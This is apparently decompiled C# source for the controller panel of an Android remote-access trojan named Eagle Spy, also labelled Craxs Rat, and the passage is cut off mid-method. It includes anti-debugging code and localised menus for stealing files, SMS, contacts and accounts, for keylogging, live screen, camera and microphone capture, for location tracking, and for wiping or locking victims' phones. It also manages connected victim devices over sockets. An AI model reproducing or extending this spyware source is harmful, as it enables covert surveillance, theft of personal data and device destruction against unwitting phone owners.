using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eaglespy;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000048 RID: 72
	[DesignerGenerated]
	public partial class EagleSpyMain : Form
	{
		// Token: 0x0600048E RID: 1166
		[DllImport("user32.dll")]
		public static extern IntPtr FindWindow(string strclassName, string strWindowName);

		// Token: 0x0600048F RID: 1167
		[DllImport("Kernel32.dll")]
		public static extern IntPtr OutputDebugString(string Txt);

		// Token: 0x06000490 RID: 1168
		[DllImport("Ntdll.dll")]
		public static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

		// Token: 0x06000491 RID: 1169
		[DllImport("Kernel32.dll")]
		public static extern IntPtr GetCurrentThread();

		// Token: 0x06000492 RID: 1170 RVA: 0x0000363E File Offset: 0x0000183E
		public static int HDB()
		{
			EagleSpyMain.MyStatus = EagleSpyMain.NtSetInformationThread(EagleSpyMain.GetCurrentThread(), 17, (IntPtr)0, 0);
			if (EagleSpyMain.MyStatus != 0)
			{
				Interaction.MsgBox("Error : X00101", (MsgBoxStyle)EagleSpyMain.MyStatus, null);
				Debugger.Break();
				return 0;
			}
			EagleSpyMain.ISDB = false;
			return 1;
		}

		// Token: 0x06000493 RID: 1171 RVA: 0x0005E238 File Offset: 0x0005C438
		public void Translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (!(language == "EN"))
			{
				if (!(language == "AR"))
				{
					if (language == "CN")
					{
						this.infobox.Text = "信息";
						this.droperbtn.Text = "安装人员";
						this.studiobtn.Text = "工作室";
						this.SentBox.Text = "发了";
						this.ReciveBox.Text = "收到";
						this.RecentBox.Text = "最近";
						this.infotitlepanel.Text = "仪表板";
						this.activityzpanel.Text = "最新活动";
						this.notifispanel.Text = "最近的通知";
						this.mappanel.Text = "连接图";
						this.callspanel.Text = "最近通话";
						this.notifiaisbtntop.Text = "通知";
						this.Home_Btn.Text = "主页";
						this.Clients_Btn.Text = "客户";
						this.blockbtn.Text = "阻止页面";
						this.Connection_btn.Text = "连接页面";
						this.Settings_btn.Text = "程序设置";
						this.porttext.Watermark = "连接端口";
						this.passtxt.Watermark = "连接键";
						this.checksavepass.Text = Codes.Translate(this.checksavepass.Text, "en", "zh");
						this.serversbtn.Text = Codes.Translate(this.serversbtn.Text, "en", "zh");
						this.ToolTips.SetToolTip(this.Home_Btn, "主页");
						this.ToolTips.SetToolTip(this.Clients_Btn, "客户页面");
						this.ToolTips.SetToolTip(this.blockbtn, "阻止页面");
						this.ToolTips.SetToolTip(this.Connection_btn, "连接页面");
						this.ToolTips.SetToolTip(this.Settings_btn, "程序设置");
						this.toblocktext.Watermark = Codes.Translate(this.toblocktext.Watermark, "en", "zh");
						this.searchtext.Watermark = "按名称、国家、地址搜索";
					}
				}
				else
				{
					this.infobox.Text = "معلومات";
					this.SentBox.Text = "الأرسال";
					this.ReciveBox.Text = "التحميل";
					this.RecentBox.Text = "جديد";
					this.infotitlepanel.Text = "الرئيسية";
					this.porttext.Watermark = "منفذ الاتصال";
					this.passtxt.Watermark = "مفتاح الاتصال";
					this.notifispanel.Text = "اخر التنبيهات";
					this.mappanel.Text = "خريطة الاتصالات";
					this.callspanel.Text = "اخر المكالمات";
					this.checksavepass.Text = Codes.Translate(this.checksavepass.Text, "en", "ar");
					this.serversbtn.Text = Codes.Translate(this.serversbtn.Text, "en", "ar");
					this.Home_Btn.Text = "الرئيسية";
					this.Clients_Btn.Text = "المستخدمين";
					this.blockbtn.Text = "قائمة الحظر";
					this.Connection_btn.Text = "قائمة الاتصالات";
					this.Settings_btn.Text = "إعدادات البرنامج";
					this.activityzpanel.Text = "اخر النشاطات";
					this.ToolTips.SetToolTip(this.Home_Btn, "الرئيسية");
					this.ToolTips.SetToolTip(this.Clients_Btn, "عملاء");
					this.ToolTips.SetToolTip(this.blockbtn, "قائمة الحظر");
					this.ToolTips.SetToolTip(this.Connection_btn, "قائمة الاتصالات");
					this.ToolTips.SetToolTip(this.Settings_btn, "إعدادات البرنامج");
					this.toblocktext.Watermark = Codes.Translate(this.toblocktext.Watermark, "en", "ar");
					this.searchtext.Watermark = "البحث بالاسم،البلد،العنوان، ...";
					this.notifiaisbtntop.Text = "إشعارات";
					this.studiobtn.Text = "الاستوديو";
					this.droperbtn.Text = "المثتب";
				}
			}
			else
			{
				this.ToolTips.SetToolTip(this.Home_Btn, "Home");
				this.ToolTips.SetToolTip(this.Clients_Btn, "Clients");
				this.ToolTips.SetToolTip(this.blockbtn, "Block List");
				this.ToolTips.SetToolTip(this.Connection_btn, "Connections");
				this.ToolTips.SetToolTip(this.Settings_btn, "Settings");
			}
			string language2 = RegistryHandler.Get_Language();
			if (Operators.CompareString(language2, "AR", false) != 0)
			{
				if (Operators.CompareString(language2, "CN", false) == 0)
				{
					this.FWctx.Items[0].Text = "允许";
					this.FWctx.Items[1].Text = "禁止";
					this.FWctx.Items[2].Text = "添加到轨道";
					this.TRKctx.Items[0].Text = "添加应用程序";
					this.TRKctx.Items[1].Text = "截图";
					this.TRKctx.Items[2].Text = "记录";
					this.TRKctx.Items[3].Text = "删除截图";
					this.TRKctx.Items[4].Text = "删除记录";
					this.TRKctx.Items[5].Text = "停止追踪";
					this.ctxmenu.Items[0].Text = "管理";
					ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)this.ctxmenu.Items[0];
					toolStripMenuItem.DropDownItems[0].Text = "文件   ";
					toolStripMenuItem.DropDownItems[1].Text = "短信";
					toolStripMenuItem.DropDownItems[2].Text = "来电";
					toolStripMenuItem.DropDownItems[3].Text = "往来";
					toolStripMenuItem.DropDownItems[4].Text = "帐户";
					toolStripMenuItem.DropDownItems[5].Text = "应用";
					toolStripMenuItem.DropDownItems[6].Text = "权限";
					this.ctxmenu.Items[2].Text = "监控";
					ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)this.ctxmenu.Items[2];
					toolStripMenuItem2.DropDownItems[0].Text = "手机屏幕";
					toolStripMenuItem2.DropDownItems[1].Text = "屏幕阅读器 2";
					toolStripMenuItem2.DropDownItems[2].Text = "相机";
					toolStripMenuItem2.DropDownItems[3].Text = "麦克风";
					toolStripMenuItem2.DropDownItems[4].Text = "键盘记录器";
					toolStripMenuItem2.DropDownItems[5].Text = "地点";
					toolStripMenuItem2.DropDownItems[6].Text = "浏览器";
					toolStripMenuItem2.DropDownItems[7].Text = "通话记录器";
					toolStripMenuItem2.DropDownItems[8].Text = "自动答题器";
					toolStripMenuItem2.DropDownItems[9].Text = "屏幕阅读器";
					this.ctxmenu.Items[4].Text = "行政";
					ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)this.ctxmenu.Items[4];
					toolStripMenuItem3.DropDownItems[0].Text = "请求管理员权限";
					toolStripMenuItem3.DropDownItems[1].Text = "锁屏";
					toolStripMenuItem3.DropDownItems[2].Text = "擦除手机数据";
					this.ctxmenu.Items[6].Text = "工具";
					ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)this.ctxmenu.Items[6];
					toolStripMenuItem4.DropDownItems[0].Text = "电话号码";
					toolStripMenuItem4.DropDownItems[1].Text = "安装软件";
					toolStripMenuItem4.DropDownItems[2].Text = "发送通知";
					toolStripMenuItem4.DropDownItems[3].Text = "剪贴板";
					toolStripMenuItem4.DropDownItems[4].Text = "打开链接";
					toolStripMenuItem4.DropDownItems[5].Text = "终端";
					this.ctxmenu.Items[8].Text = "额外的";
					ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)this.ctxmenu.Items[8];
					toolStripMenuItem5.DropDownItems[0].Text = "通知";
					toolStripMenuItem5.DropDownItems[1].Text = "通话活动";
					toolStripMenuItem5.DropDownItems[2].Text = "电话信息";
					this.ctxmenu.Items[10].Text = "联系";
					ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)this.ctxmenu.Items[10];
					toolStripMenuItem6.DropDownItems[0].Text = "重新连接";
					toolStripMenuItem6.DropDownItems[1].Text = "堵塞";
					toolStripMenuItem6.DropDownItems[2].Text = "禁用反删除";
					toolStripMenuItem6.DropDownItems[3].Text = "自行删除";
					this.ctxmenu.Items[12].Text = "键盘 (beta)";
					this.ctxmenu.Items[14].Text = "客户文件夹";
					return;
				}
			}
			else
			{
				this.ctxmenu.Items[0].Text = "إدارة";
				ToolStripMenuItem toolStripMenuItem7 = (ToolStripMenuItem)this.ctxmenu.Items[0];
				toolStripMenuItem7.DropDownItems[0].Text = "الملفات";
				toolStripMenuItem7.DropDownItems[1].Text = "الرسائل";
				toolStripMenuItem7.DropDownItems[2].Text = "المكالمات";
				toolStripMenuItem7.DropDownItems[3].Text = "الأسماء";
				toolStripMenuItem7.DropDownItems[4].Text = "الحسابات";
				toolStripMenuItem7.DropDownItems[5].Text = "التطبيقات";
				toolStripMenuItem7.DropDownItems[6].Text = "الصلاحيات";
				this.ctxmenu.Items[2].Text = "مراقبة";
				ToolStripMenuItem toolStripMenuItem8 = (ToolStripMenuItem)this.ctxmenu.Items[2];
				toolStripMenuItem8.DropDownItems[0].Text = "شاشة الهاتف";
				toolStripMenuItem8.DropDownItems[1].Text = "قراءة الشاشة 2";
				toolStripMenuItem8.DropDownItems[2].Text = "الكاميرا";
				toolStripMenuItem8.DropDownItems[3].Text = "الميكروفون";
				toolStripMenuItem8.DropDownItems[4].Text = "مسجل المفاتيح";
				toolStripMenuItem8.DropDownItems[5].Text = "الموقع";
				toolStripMenuItem8.DropDownItems[6].Text = "المتصفح";
				toolStripMenuItem8.DropDownItems[7].Text = "مسجل المكالمات";
				toolStripMenuItem8.DropDownItems[8].Text = "شاشة المس";
				toolStripMenuItem8.DropDownItems[9].Text = "قراءة الشاشة";
				this.ctxmenu.Items[4].Text = "مسؤول";
				ToolStripMenuItem toolStripMenuItem9 = (ToolStripMenuItem)this.ctxmenu.Items[4];
				toolStripMenuItem9.DropDownItems[0].Text = "تفعيل مسؤول الجهاز";
				toolStripMenuItem9.DropDownItems[1].Text = "قفل الهاتف";
				toolStripMenuItem9.DropDownItems[2].Text = "حذف ملفات الهاتف";
				this.ctxmenu.Items[6].Text = "أدواة";
				ToolStripMenuItem toolStripMenuItem10 = (ToolStripMenuItem)this.ctxmenu.Items[6];
				toolStripMenuItem10.DropDownItems[0].Text = "إجراء إتصال";
				toolStripMenuItem10.DropDownItems[1].Text = "تثبيت تطبيق";
				toolStripMenuItem10.DropDownItems[2].Text = "إرسال تنبيه";
				toolStripMenuItem10.DropDownItems[3].Text = "الحافظة";
				toolStripMenuItem10.DropDownItems[4].Text = "فتح موقع";
				toolStripMenuItem10.DropDownItems[5].Text = "موجه الأوامر";
				this.ctxmenu.Items[8].Text = "المزيد";
				ToolStripMenuItem toolStripMenuItem11 = (ToolStripMenuItem)this.ctxmenu.Items[8];
				toolStripMenuItem11.DropDownItems[0].Text = "إشعارات الهاتف";
				toolStripMenuItem11.DropDownItems[1].Text = "المكالمات الحالية";
				toolStripMenuItem11.DropDownItems[2].Text = "معلومات الهاتف";
				this.ctxmenu.Items[10].Text = "الإتصال";
				ToolStripMenuItem toolStripMenuItem12 = (ToolStripMenuItem)this.ctxmenu.Items[10];
				toolStripMenuItem12.DropDownItems[0].Text = "إعادة الأتصال";
				toolStripMenuItem12.DropDownItems[1].Text = "حظر المستخدم";
				toolStripMenuItem12.DropDownItems[2].Text = "إيقاف منع الحذف";
				toolStripMenuItem12.DropDownItems[3].Text = "حذف التطبيق";
				this.ctxmenu.Items[12].Text = "لوحة المفاتيح (beta)";
				this.ctxmenu.Items[14].Text = "ملفات المستخدم";
				this.TRKctx.Items[0].Text = "إضافة تطبيق";
				this.TRKctx.Items[1].Text = "لقطات الشاشة";
				this.TRKctx.Items[2].Text = "السجلات";
				this.TRKctx.Items[3].Text = "حذف  لقطات الشاشة";
				this.TRKctx.Items[4].Text = "حذف السجلات";
				this.TRKctx.Items[5].Text = "إيقاف التتبع";
				this.FWctx.Items[0].Text = "السماح";
				this.FWctx.Items[1].Text = "حظر";
				this.FWctx.Items[2].Text = "اضافة للتعقب";
			}
		}

		// Token: 0x06000494 RID: 1172 RVA: 0x0005F1F4 File Offset: 0x0005D3F4
		public void Newinstance()
		{
			this.InitializeComponent();
			this.UpdateLanguage();
			RegistryHandler.iniliz();
			if (Conversions.ToBoolean(Operators.NotObject(Codes.inializeReg())))
			{
				Interaction.MsgBox("Error Reg Config", MsgBoxStyle.OkOnly, null);
				Environment.Exit(0);
			}
			if (RegistryHandler.Get_Language() == null)
			{
				LanguageSelector languageSelector = new LanguageSelector();
				languageSelector.ShowDialog();
				string selectedLang = languageSelector.SelectedLang;
				if (!(selectedLang == "AR"))
				{
					if (!(selectedLang == "EN"))
					{
						if (!(selectedLang == "CN"))
						{
							RegistryHandler.Set_Language("EN");
						}
						else
						{
							RegistryHandler.Set_Language("CN");
						}
					}
					else
					{
						RegistryHandler.Set_Language("EN");
					}
				}
				else
				{
					RegistryHandler.Set_Language("AR");
				}
			}
			this.Translateme();
			this.SCANER = new clsComputerInfo();
			Data.MainForm = this;
		}

		// Token: 0x06000495 RID: 1173 RVA: 0x0005F2C0 File Offset: 0x0005D4C0
		public EagleSpyMain()
		{
			base.Load += this.CraxsRatMain_Load;
			base.Closing += this.AngelAndroidForm_Closing;
			base.FormClosing += this.AngelAndroidForm_FormClosing;
			base.Deactivate += this.CypherRat_Deactivate;
			base.Activated += this.CypherRat_Activated;
			this.PORTs = "";
			this.server = new List<Accept>();
			this.Myname = "Craxs Rat";
			this.Alive = true;
			this.DKF = "";
			this.DKD = "BRTHRRTBSA";
			this.GlobalMap = new GeoMap();
			this.Globalvlues = null;
			this.NumWorkers = 0;
			this.SCANER = null;
			this.isactive = true;
			this.searchbefore = new List<DataGridViewRow>();
			this.Newinstance();
		}

		// Token: 0x06000496 RID: 1174 RVA: 0x0000367E File Offset: 0x0000187E
		private void NotifyI()
		{
			this.notfi.Visible = true;
		}

		// Token: 0x06000497 RID: 1175 RVA: 0x0000368C File Offset: 0x0000188C
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x06000498 RID: 1176 RVA: 0x0005F3A8 File Offset: 0x0005D5A8
		private void Countryclickhandelr(object arg1, MapData arg2)
		{
			Point position = Cursor.Position;
			checked
			{
				position.Y += (int)Math.Round(unchecked((double)this.Cursor.Size.Height * 1.5));
				this.ToolTips.Show(arg2.Name, this, base.PointToClient(position), 3000);
			}
		}

		// Token: 0x06000499 RID: 1177 RVA: 0x0005F40C File Offset: 0x0005D60C
		[DebuggerStepThrough]
		private void CraxsRatMain_Load(object sender, EventArgs e)
		{
			EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load vb_0024StateMachine_28_CraxsRatMain_Load = new EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load();
			vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Me = this;
			vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Local_sender = sender;
			vb_0024StateMachine_28_CraxsRatMain_Load._0024VB_0024Local_e = e;
			vb_0024StateMachine_28_CraxsRatMain_Load._0024State = -1;
			vb_0024StateMachine_28_CraxsRatMain_Load._0024Builder = AsyncVoidMethodBuilder.Create();
			vb_0024StateMachine_28_CraxsRatMain_Load._0024Builder.Start<EagleSpyMain.VB_0024StateMachine_28_CraxsRatMain_Load>(ref vb_0024StateMachine_28_CraxsRatMain_Load);
			this.cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
			this.LoadTextBoxValues();
			this.licmgr();
			this.timer1.Start();
		}

		// Token: 0x0600049A RID: 1178 RVA: 0x00002423 File Offset: 0x00000623
		private void licmgr()
		{
		}

		// Token: 0x0600049B RID: 1179 RVA: 0x0005F484 File Offset: 0x0005D684
		private void LoadTextBoxValues()
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = Path.Combine(baseDirectory, "WinMM.Net.dll");
			if (File.Exists(text))
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 3)
				{
					this.label11.Text = array[631];
					return;
				}
			}
			else
			{
				this.FormEventArgsClosing();
			}
		}

		// Token: 0x0600049C RID: 1180 RVA: 0x0005F4D8 File Offset: 0x0005D6D8
		private void SizeDGV(DataGridView dgv)
		{
			dgv.ScrollBars = ScrollBars.None;
			checked
			{
				int num = dgv.Rows.GetRowsHeight(DataGridViewElementStates.None) + dgv.ColumnHeadersHeight;
				num += dgv.Rows.Count * 4;
				int num2 = dgv.Columns.GetColumnsWidth(DataGridViewElementStates.None) + dgv.RowHeadersWidth;
				dgv.ClientSize = new Size(num2, num);
			}
		}

		// Token: 0x0600049D RID: 1181 RVA: 0x000036C2 File Offset: 0x000018C2
		private void AngelAndroidForm_Closing(object sender, CancelEventArgs e)
		{
			this.FormEventArgsClosing();
		}

		// Token: 0x0600049E RID: 1182 RVA: 0x0005F534 File Offset: 0x0005D734
		public void FormEventArgsClosing()
		{
			try
			{
				this.notfi.Visible = false;
				this.Statustimer.Stop();
				this.monitortimer.Stop();
				if (this.checksavepass.Checked)
				{
					MySettingsProperty.Settings.savepass = true;
					MySettingsProperty.Settings.Save();
				}
				else
				{
					MySettingsProperty.Settings.savepass = false;
					MySettingsProperty.Settings.Save();
				}
			}
			catch (Exception)
			{
			}
			checked
			{
				try
				{
					this.Alive = false;
					Thread.Sleep(5);
					if (this.server != null)
					{
						int num = this.server.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								this.server[i].MainListner.Stop();
								this.server[i].MainListner.Server.Close();
							}
							catch (Exception)
							{
							}
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					this.PORTs = "";
					foreach (object obj in ((IEnumerable)this.DGVSERVS.Rows))
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						ref string ptr = ref this.PORTs;
						ptr = ptr + dataGridViewRow.Cells[1].Value.ToString() + ">";
					}
					MySettingsProperty.Settings.ports = this.PORTs;
					MySettingsProperty.Settings.Save();
				}
				catch (Exception)
				{
				}
				Application.ExitThread();
				Environment.Exit(0);
				this.httpListener.Stop();
			}
		}

		// Token: 0x0600049F RID: 1183 RVA: 0x000036CA File Offset: 0x000018CA
		public void notfi_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				if (base.WindowState != FormWindowState.Normal)
				{
					base.WindowState = FormWindowState.Normal;
				}
				base.TopMost = true;
				base.TopMost = false;
			}
		}

		// Token: 0x060004A0 RID: 1184 RVA: 0x0005F6FC File Offset: 0x0005D8FC
		private void BuildToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.B == null)
			{
				this.B = new Build();
				DialogResult dialogResult = this.B.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.B.Close();
					this.B = null;
					return;
				}
				this.B.Close();
				this.B = null;
			}
		}

		// Token: 0x060004A1 RID: 1185 RVA: 0x000036C2 File Offset: 0x000018C2
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.FormEventArgsClosing();
		}

		// Token: 0x060004A2 RID: 1186 RVA: 0x0005F754 File Offset: 0x0005D954
		public void StartWorkercheck()
		{
			this.NumWorkers = Operators.AddObject(this.NumWorkers, 1);
			this.Workers = new BackgroundWorker[checked(Conversions.ToInteger(this.NumWorkers) + 1)];
			this.Workers[Conversions.ToInteger(this.NumWorkers)] = new BackgroundWorker();
			this.Workers[Conversions.ToInteger(this.NumWorkers)].WorkerReportsProgress = true;
			this.Workers[Conversions.ToInteger(this.NumWorkers)].WorkerSupportsCancellation = true;
			this.Workers[Conversions.ToInteger(this.NumWorkers)].DoWork += this.myworker;
			this.Workers[Conversions.ToInteger(this.NumWorkers)].RunWorkerAsync();
		}

		// Token: 0x060004A3 RID: 1187 RVA: 0x000036F6 File Offset: 0x000018F6
		private void myworker(object sender, DoWorkEventArgs e)
		{
			Thread.Sleep(1000);
			this.PortsManager.opebbtn(new object[] { "" });
		}

		// Token: 0x060004A4 RID: 1188 RVA: 0x0005F814 File Offset: 0x0005DA14
		public void addLog(object[] objs)
		{
			if (this.DataLog.InvokeRequired)
			{
				EagleSpyMain.addLogback addLogback = new EagleSpyMain.addLogback(this.addLog);
				this.DataLog.Invoke(addLogback, new object[] { objs });
				return;
			}
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			string text2 = Conversions.ToString(objs[2]);
			string text3 = Conversions.ToString(objs[3]);
			this.DataLog.Rows.Add(new object[]
			{
				image,
				text,
				text2,
				text3,
				DateAndTime.Now.ToShortTimeString().ToString()
			});
			if (this.checkclearlogs.Checked && this.DataLog.Rows.Count > 20)
			{
				this.DataLog.Rows.Clear();
			}
		}

		// Token: 0x060004A5 RID: 1189 RVA: 0x0005F8E8 File Offset: 0x0005DAE8
		public void LogNotifi(object[] objs)
		{
			if (this.DGVNOTF.InvokeRequired)
			{
				EagleSpyMain.deleNotifidgv deleNotifidgv = new EagleSpyMain.deleNotifidgv(this.LogNotifi);
				this.DGVNOTF.Invoke(deleNotifidgv, new object[] { objs });
				return;
			}
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVNOTF.Rows.Count >= 100)
			{
				this.DGVNOTF.Rows.Remove(this.DGVNOTF.Rows[0]);
			}
			this.DGVNOTF.Rows.Add(new object[] { image, text });
			this.richTextBox1.Text = text;
		}

		// Token: 0x060004A6 RID: 1190 RVA: 0x0005F99C File Offset: 0x0005DB9C
		public void LogCalls(object[] objs)
		{
			if (this.DGVCALLS.InvokeRequired)
			{
				EagleSpyMain.delecallsidgv delecallsidgv = new EagleSpyMain.delecallsidgv(this.LogCalls);
				this.DGVCALLS.Invoke(delecallsidgv, new object[] { objs });
				return;
			}
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVCALLS.Rows.Count >= 100)
			{
				this.DGVCALLS.Rows.Remove(this.DGVCALLS.Rows[0]);
			}
			this.DGVCALLS.Rows.Add(new object[] { image, text });
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x0005FA44 File Offset: 0x0005DC44
		public void Logalert(object[] objs)
		{
			if (this.DGVALRTS.InvokeRequired)
			{
				EagleSpyMain.delealertsidgv delealertsidgv = new EagleSpyMain.delealertsidgv(this.Logalert);
				this.DGVALRTS.Invoke(delealertsidgv, new object[] { objs });
				return;
			}
			Image image = (Image)objs[0];
			string text = Conversions.ToString(objs[1]);
			if (this.DGVALRTS.Rows.Count >= 100)
			{
				this.DGVALRTS.Rows.Remove(this.DGVALRTS.Rows[0]);
			}
			this.DGVALRTS.Rows.Add(new object[] { image, text });
		}

		// Token: 0x060004A8 RID: 1192 RVA: 0x0005FAEC File Offset: 0x0005DCEC
		public void UpdateForms(Client TargetClient)
		{
			foreach (object obj in Application.OpenForms)
			{
				Form form = (Form)obj;
				try
				{
					if (form != null && form.Tag != null)
					{
						CameraManager cameraManager = new CameraManager();
						if (Operators.CompareString(form.Tag.ToString(), "Cam_" + TargetClient.UUID, false) == 0)
						{
							cameraManager = (CameraManager)form;
							cameraManager.Name = "Camera_Manager_" + TargetClient.ClientRemoteAddress;
							cameraManager.Tag = "Cam_" + TargetClient.UUID;
							if (Operators.CompareString(cameraManager.CamerID, "null", false) != 0)
							{
								cameraManager.classClient = TargetClient;
								cameraManager.Client = TargetClient.myClient;
								cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
								cameraManager.Selected(cameraManager.CamerID);
								cameraManager.statustext.Text = "Reconnecting....";
								cameraManager.CAM0.Image = Resources.loading_please_wait;
							}
							else
							{
								cameraManager.classClient = TargetClient;
								cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
								cameraManager.Text = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
								if (cameraManager.classClient != null)
								{
									reso.Directory_Exist(cameraManager.classClient);
									cameraManager.tmpFolderUSER = TargetClient.FolderUSER;
								}
								cameraManager.Client = cameraManager.classClient.myClient;
								cameraManager.classCamera = TargetClient;
								cameraManager.TempImage = new PictureBox();
							}
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "screen_" + TargetClient.UUID, false) == 0)
					{
						Button5 button = (Button5)form;
						if (button != null)
						{
							if (button.LIVE)
							{
								string[] array = TargetClient.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									TargetClient.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sc:on:",
										button.Qualtibox.Text,
										"~",
										button.FPSBOX.Text,
										"~",
										TargetClient.ClientRemoteAddress,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										TargetClient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									TargetClient
								};
								TargetClient.SendMessage(array2);
								button.toptitle.Text = "Reconnecting , Please Wait...";
								button.Livepicbox.Image = Resources.loading_please_wait;
								button.Livepicbox.Enabled = true;
								button.LIVE = true;
								button.refreshtimer.Enabled = true;
								button.refreshtimer.Start();
							}
							else
							{
								string text = "Live_Screen_" + TargetClient.ClientRemoteAddress;
								button.Name = text;
								button.Title = string.Format("{0} - IP:{1}", "Live Screen", TargetClient.ClientAddressIP);
								button.Tag = TargetClient.ClientAddressIP;
								button.classClient = TargetClient;
								button.Client = TargetClient.myClient;
								button.toptitle.Text = "Client Ready...";
								button.DownloadsFolder = TargetClient.FolderUSER;
								button.Livepicbox.Image = null;
								button.Tag = "screen_" + TargetClient.UUID;
							}
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					if (form != null && form.Tag != null && Operators.CompareString(form.Tag.ToString(), "File" + TargetClient.UUID, false) == 0)
					{
						FileManager fileManager = (FileManager)form;
						fileManager.Tag = "File" + TargetClient.UUID;
						fileManager.Name = "File_Manager_File" + TargetClient.UUID;
						fileManager.Title = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
						fileManager.Text = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
						fileManager.Client = TargetClient.myClient;
						fileManager.classClient = TargetClient;
						fileManager.ver = TargetClient.VersionClient;
						fileManager.DGV0.AutoGenerateColumns = false;
						fileManager.DGV0.Columns[5].DisplayIndex = 0;
						fileManager.viwimage.Image = null;
						break;
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060004A9 RID: 1193 RVA: 0x00060054 File Offset: 0x0005E254
		public void Addnewrow(object[] objs)
		{
			if (this.ClientsWindow.InvokeRequired)
			{
				EagleSpyMain.deleaddnewrow deleaddnewrow = new EagleSpyMain.deleaddnewrow(this.Addnewrow);
				this.ClientsWindow.Invoke(deleaddnewrow, new object[] { objs });
				return;
			}
			try
			{
				Client client = (Client)objs[0];
				Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
				lock (clientRowIndices)
				{
					if (Data._clientRowIndices.ContainsKey(client.UUID))
					{
						try
						{
							Client client2 = Data._clientRowIndices[client.UUID];
							int index = Data._clientRowIndices[client.UUID].Row.Index;
							client.Keys.Split(new char[] { ':' });
							this.ClientsWindow.Rows[index].Cells[0].Value = reso.GetScreen(client.Screen);
							this.ClientsWindow.Rows[index].Cells[1].Value = client.Wallpaper;
							this.ClientsWindow.Rows[index].Cells[2].Value = client.Flag;
							this.ClientsWindow.Rows[index].Cells[3].Value = client.ClientName;
							this.ClientsWindow.Rows[index].Cells[4].Value = client.Country;
							this.ClientsWindow.Rows[index].Cells[5].Value = client.android;
							this.ClientsWindow.Rows[index].Cells[6].Value = client.Phone_model;
							this.ClientsWindow.Rows[index].Cells[7].Value = client.Statistics;
							this.ClientsWindow.Rows[index].Tag = client.UUID;
							this.ClientsWindow.Rows[index].Cells[8].Tag = client;
							this.ClientsWindow.Rows[index].Cells[6].Tag = client.UUID;
							this.ClientsWindow.Rows[index].Cells[2].Tag = client.UUID;
							client.Row = client2.Row;
							client.Statistics = "Reset";
							this.ClientsWindow.Rows[index].Cells[7].Style.ForeColor = Color.Lime;
						}
						catch (Exception)
						{
						}
						Data._clientRowIndices[client.UUID] = client;
					}
					else
					{
						string[] array = client.Keys.Split(new char[] { ':' });
						int num = this.ClientsWindow.Rows.Add(new object[]
						{
							reso.GetScreen(client.Screen),
							client.Wallpaper,
							client.Flag,
							client.ClientName,
							client.Country,
							client.ClientAddressIP + ":" + array[1],
							client.android,
							client.Phone_model,
							Codes.BlankImage(),
							Codes.BlankImage(),
							reso.GetBattery(client.Battery),
							client.Wifi,
							"",
							client.ClientDefender,
							reso.CheckAdmin(client.IsAdminActive),
							"New",
							client.installdate
						});
						client.Row = this.ClientsWindow.Rows[num];
						this.ClientsWindow.Rows[num].Tag = client.UUID;
						this.ClientsWindow.Rows[num].Cells[8].Tag = client;
